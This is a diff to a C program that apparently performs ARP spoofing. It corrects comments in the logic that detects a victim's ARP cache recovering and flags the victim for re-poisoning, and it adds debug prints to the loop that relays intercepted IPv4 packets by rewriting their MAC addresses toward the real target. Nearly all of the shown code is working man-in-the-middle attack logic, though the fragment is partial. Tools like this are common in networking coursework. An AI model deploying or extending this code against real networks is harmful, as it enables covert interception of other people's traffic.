@@ -264,9 +264,9 @@ int main(int argc, char* argv[])
                                 }
                             }
                                 // 4. recovery: sender -> target ip & attacker mac (unicast) ask
-                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
-                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
-                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) == 0){ // check broadcast
+                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) == 0){
                                         printf("[Detected] ARP Request from sender to target (unicast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
@@ -287,6 +287,8 @@ int main(int argc, char* argv[])
                     if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_IPv4){
                         if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                             if(memcmp((uint8_t *)packet + IPv4_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
+                                printf("Relaying...\n");
+                                printf("%d\n", header->caplen);
                                 uint8_t * now_packet = (uint8_t *) packet;
                                     // while packet relaying, we only change mac addr
                                         // src_mac = sender, dst_mac = attacker => src_mac = attacker, dst_mac = target
